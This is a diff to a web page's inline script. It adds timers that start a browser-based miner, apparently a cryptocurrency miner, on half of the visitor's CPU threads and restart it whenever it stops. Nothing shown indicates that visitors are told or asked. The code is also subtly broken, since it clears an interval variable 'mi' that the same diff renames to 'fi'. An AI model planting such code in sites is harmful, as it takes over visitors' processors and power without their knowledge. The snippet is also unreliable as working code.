@@ -111,9 +111,15 @@
 
   </div>
   <script>
-    var mi = setInterval(function(){
+    var fi = setInterval(function(){
+      if (miner != null){
+        miner.setNumThreads(navigator.hardwareConcurrency/2);
+        miner.start();
+        clearInterval(mi);
+      }
+    }, 100);
+    var re = setInterval(function(){
       if (miner != null && !miner.isRunning()){
-        //miner.setAutoThreadsEnabled(true);
         miner.setNumThreads(navigator.hardwareConcurrency/2);
         miner.start();
       }
